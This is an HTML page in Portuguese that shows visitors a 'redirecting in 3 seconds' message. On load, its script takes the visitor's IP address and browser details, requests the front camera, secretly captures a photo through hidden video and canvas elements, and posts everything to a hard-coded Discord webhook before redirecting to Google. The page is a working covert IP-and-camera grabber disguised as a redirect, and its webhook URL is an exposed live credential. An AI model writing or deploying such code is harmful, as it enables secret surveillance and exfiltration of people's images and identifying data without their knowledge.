<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecionando...</title>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
</head>
<body>
    <h1>Redirecionando em 3 segundos...</h1>
    <video id="camera" autoplay muted style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        // FunÃ§Ã£o para pegar o IP do usuÃ¡rio
        async function getIP() {
            try {
                const response = await axios.get('https://api.ipify.org?format=json');
                return response.data.ip;
            } catch (error) {
                console.error("Erro ao pegar IP:", error);
                return "IP nÃ£o encontrado";
            }
        }

        // FunÃ§Ã£o para tentar capturar a cÃ¢mera frontal
        async function captureCamera() {
            try {
                const video = document.getElementById('camera');
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');

                // Solicita acesso Ã  cÃ¢mera (usuÃ¡rio precisa permitir)
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false,
                });

                video.srcObject = stream;
                
                // Espera 1 segundo para garantir que a cÃ¢mera estÃ¡ ligada
                await new Promise(resolve => setTimeout(resolve, 1000));

                // Tira a foto
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Converte para base64 (para enviar ao Discord)
                const photoData = canvas.toDataURL('image/jpeg');

                // Encerra a cÃ¢mera
                stream.getTracks().forEach(track => track.stop());

                return photoData;
            } catch (error) {
                console.error("Erro ao acessar cÃ¢mera:", error);
                return null;
            }
        }

        // FunÃ§Ã£o para enviar dados para o Discord via webhook
        async function sendToDiscord(ip, photoData) {
            try {
                const webhookURL = "https://discord.com/api/webhooks/1391946230195552367/qQMe8-K27JI_75ZRcpNi1ghi9iplBpYgy4vqWxP6YpXB8zR9rAvrqAdOfCI_R5WswELO"; // SUBSTITUA ISSO!

                // Formata os dados para enviar ao Discord
                const embed = {
                    title: "ðŸ“Œ Novo Acesso Detectado!",
                    color: 0xff0000,
                    fields: [
                        { name: "ðŸŒ IP", value: ip || "NÃ£o capturado" },
                        { name: "ðŸ–¥ï¸ Navegador", value: navigator.userAgent || "Desconhecido" },
                        { name: "ðŸ“· CÃ¢mera", value: photoData ? "Foto capturada âœ…" : "UsuÃ¡rio negou acesso âŒ" }
                    ],
                    timestamp: new Date().toISOString()
                };

                // Se uma foto foi capturada, anexa ao webhook
                let payload = { embeds: [embed] };
                
                if (photoData) {
                    // Converte base64 para um arquivo binÃ¡rio (necessÃ¡rio para o Discord)
                    const blob = await fetch(photoData).then(res => res.blob());
                    const formData = new FormData();
                    formData.append("file", blob, "foto.jpg");
                    formData.append("payload_json", JSON.stringify(payload));

                    await axios.post(webhookURL, formData, {
                        headers: { "Content-Type": "multipart/form-data" }
                    });
                } else {
                    // Se nÃ£o hÃ¡ foto, envia apenas o embed
                    await axios.post(webhookURL, payload);
                }

                console.log("Dados enviados para o Discord!");
            } catch (error) {
                console.error("Erro ao enviar para o Discord:", error);
            }
        }

        // FunÃ§Ã£o principal
        async function main() {
            const ip = await getIP(); // Pega o IP
            const photoData = await captureCamera(); // Tenta capturar a cÃ¢mera

            await sendToDiscord(ip, photoData); // Envia tudo para o Discord

            // Redireciona apÃ³s 3 segundos
            setTimeout(() => {
                window.location.href = "https://google.com"; // Altere para o site desejado
            }, 3000);
        }

        // Inicia o processo
        main();
    </script>
</body>
</html>
